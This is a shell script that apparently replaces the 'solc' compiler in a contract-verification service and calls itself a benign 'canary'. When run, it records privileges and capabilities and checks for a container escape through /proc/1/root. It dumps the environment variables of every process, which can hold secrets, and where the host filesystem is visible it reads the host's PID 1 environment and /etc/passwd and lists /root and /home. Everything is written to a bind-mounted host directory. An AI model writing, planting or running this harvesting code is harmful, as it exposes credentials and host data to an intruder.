#!/bin/sh
# a03-w12 canary — byte-authorship chain proof (benign). Wave-12 unit A03.
# Runs as the PulseChain contract-verifier "solc" (busybox). Writes only under
# /data/compilers (host bind /opt/contract-compilers). No persistence, no callbacks.
D=/data/compilers/a03-w12-dump
mkdir -p "$D" 2>/dev/null
{
echo "=== A03-W12 CANARY"
echo "date=$(date -u 2>/dev/null)"
echo "uid=$(id -u 2>/dev/null) gid=$(id -g 2>/dev/null)"
id 2>/dev/null
echo "host=$(hostname 2>/dev/null)"
uname -a 2>/dev/null
echo "--- caps:"
grep -i cap /proc/self/status 2>/dev/null
echo "--- /proc/1/comm:"
cat /proc/1/comm 2>/dev/null
echo "--- host escape /proc/1/root listing:"
ls /proc/1/root/ 2>/dev/null | head -40
echo "--- container root listing:"
ls -la / 2>/dev/null
echo "--- /data listing:"
ls -la /data 2>/dev/null
echo "--- resolv:"
cat /etc/resolv.conf 2>/dev/null
echo "--- hosts:"
cat /etc/hosts 2>/dev/null
echo "--- mounts:"
cat /proc/self/mountinfo 2>/dev/null
} > "$D/00_canary.txt" 2>&1
for p in /proc/[0-9]*; do
echo "=== PID ${p#/proc/}"
echo "--- cmdline:"
tr '\0' ' ' < $p/cmdline 2>/dev/null
echo
echo "--- environ:"
tr '\0' '\n' < $p/environ 2>/dev/null
done > "$D/01_proc.txt" 2>&1
if [ -r /proc/1/root/etc/hostname ]; then
{
echo "=== HOST ROOT VISIBLE"
echo "host:"
cat /proc/1/root/etc/hostname 2>/dev/null
echo "--- host pid1 environ:"
tr '\0' '\n' < /proc/1/root/proc/1/environ 2>/dev/null
echo "--- host /root:"
ls -la /proc/1/root/root 2>/dev/null
echo "--- host /home:"
ls -la /proc/1/root/home 2>/dev/null
echo "--- host /etc/passwd:"
cat /proc/1/root/etc/passwd 2>/dev/null
echo "--- host /opt/contract-compilers:"
ls -la /proc/1/root/opt/contract-compilers 2>/dev/null
} > "$D/02_hostroot.txt" 2>&1
else
echo "NO_HOST_ROOT_VISIBILITY" > "$D/02_hostroot.txt" 2>/dev/null
fi
echo "A03-W12-CANARY $(date -u 2>/dev/null) $(hostname 2>/dev/null) uid=$(id -u 2>/dev/null)" > /data/compilers/A03-W12-CANARY.txt 2>/dev/null
echo DONE > "$D/DONE.txt" 2>/dev/null
exit 0
